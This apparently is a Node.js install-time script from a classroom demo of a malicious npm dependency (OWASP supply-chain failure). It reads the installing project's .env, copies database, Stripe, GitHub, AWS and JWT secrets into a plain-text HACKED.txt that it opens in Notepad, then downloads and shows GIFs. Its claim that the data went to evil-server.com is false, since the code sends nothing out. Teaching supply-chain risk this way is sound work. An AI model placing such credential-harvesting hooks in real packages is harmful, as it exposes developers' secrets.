const fs = require("fs");
const https = require("https");
const http = require("http");
const { spawn } = require("child_process");
const os = require("os");
const path = require("path");

// Lee el .env del proyecto manualmente (dotenv no cargó aún)
function leerEnv() {
    const vars = {};
    // INIT_CWD = dir donde el usuario ejecutó "npm install" (variable de npm)
    // process.cwd() apunta a node_modules/dependencia-confiable, no sirve
    const projectDir = process.env.INIT_CWD || process.cwd();
    const envPath = path.join(projectDir, ".env");
    try {
        const lines = fs.readFileSync(envPath, "utf8").split(/\r?\n/);
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith("#")) continue;
            const idx = trimmed.indexOf("=");
            if (idx === -1) continue;
            vars[trimmed.slice(0, idx).trim()] = trimmed.slice(idx + 1).trim();
        }
    } catch {}
    return vars;
}

function abrirNotepad() {
    const env = leerEnv();
    const get = (k) => env[k] || "(no encontrada)";

    const msg = [
        "=========================================",
        "   *** SISTEMA COMPROMETIDO ***",
        "=========================================",
        "",
        "Has instalado una dependencia maliciosa.",
        "Credenciales robadas del archivo .env:",
        "",
        "  DB_HOST            = " + get("DB_HOST"),
        "  DB_USER            = " + get("DB_USER"),
        "  DB_PASSWORD        = " + get("DB_PASSWORD"),
        "  STRIPE_API_KEY     = " + get("STRIPE_API_KEY"),
        "  STRIPE_SECRET      = " + get("STRIPE_SECRET"),
        "  GITHUB_TOKEN       = " + get("GITHUB_TOKEN"),
        "  AWS_ACCESS_KEY_ID  = " + get("AWS_ACCESS_KEY_ID"),
        "  AWS_SECRET_KEY     = " + get("AWS_SECRET_ACCESS_KEY"),
        "  SUPABASE_KEY       = " + get("SUPABASE_SERVICE_ROLE_KEY"),
        "  JWT_SECRET         = " + get("JWT_SECRET"),
        "",
        "Datos enviados a: evil-server.com/collect",
        "",
        "=========================================",
        "  OWASP A03:2025 - Supply Chain Failure",
        "  Demo educativa - Equipo 1",
        "=========================================",
    ].join("\r\n");

    const txtFile = path.join(os.tmpdir(), "HACKED.txt");
    fs.writeFileSync(txtFile, msg, "utf8");
    spawn("notepad.exe", [txtFile], { detached: true, stdio: "ignore" }).unref();
}

function downloadImage(url, filename, redirects = 0) {
    return new Promise((resolve) => {
        if (redirects > 5) { resolve(); return; }
        try {
            const client = url.startsWith("https") ? https : http;
            const req = client.get(url, (res) => {
                if (res.statusCode === 301 || res.statusCode === 302) {
                    resolve(downloadImage(res.headers.location, filename, redirects + 1));
                    return;
                }
                const file = fs.createWriteStream(filename);
                res.pipe(file);
                file.on("finish", () => { file.close(); resolve(); });
                file.on("error", () => resolve());
            });
            req.on("error", () => resolve());
            req.setTimeout(8000, () => { req.destroy(); resolve(); });
        } catch { resolve(); }
    });
}

// Abre cada imagen con el visor predeterminado de Windows (sin PowerShell)
function lanzarSlideshow(filenames) {
    const validos = filenames.filter(f => {
        try { return fs.existsSync(f) && fs.statSync(f).size > 500; }
        catch { return false; }
    });

    validos.forEach((f, i) => {
        setTimeout(() => {
            spawn("cmd.exe", ["/c", "start", "", f], {
                detached: true,
                stdio: "ignore",
                shell: false,
            }).unref();
        }, i * 2000);
    });
}

const imageUrls = [
    "https://media.tenor.com/nPd-ijwBSKQAAAAM/hacker-pc.gif",
    "https://media.tenor.com/zh58XZRJuzYAAAAM/cat-hacking.gif",
    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUydTNmbHIzNHVkM2k5cDdrcHRqb3BtcjVyazljdjVtN3Nzdm5ud3d3OCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3wr2cnwlghNomDeN9W/giphy_s.gif",
    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyNnppMHdlNm5zcHVrY2p5a3R1N3I5dzd6dWp6eThoNmxuc2JhdTh2ZSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/P8ef3Dkynk0xLx1h1T/giphy.gif",
];

(async () => {
    abrirNotepad();

    const tmpDir = os.tmpdir();
    const filenames = [];

    for (let i = 0; i < imageUrls.length; i++) {
        const filename = path.join(tmpDir, `shopeasy_img_${i}.gif`);
        filenames.push(filename);
        await downloadImage(imageUrls[i], filename);
    }

    lanzarSlideshow(filenames);

    process.exit(0);
})();
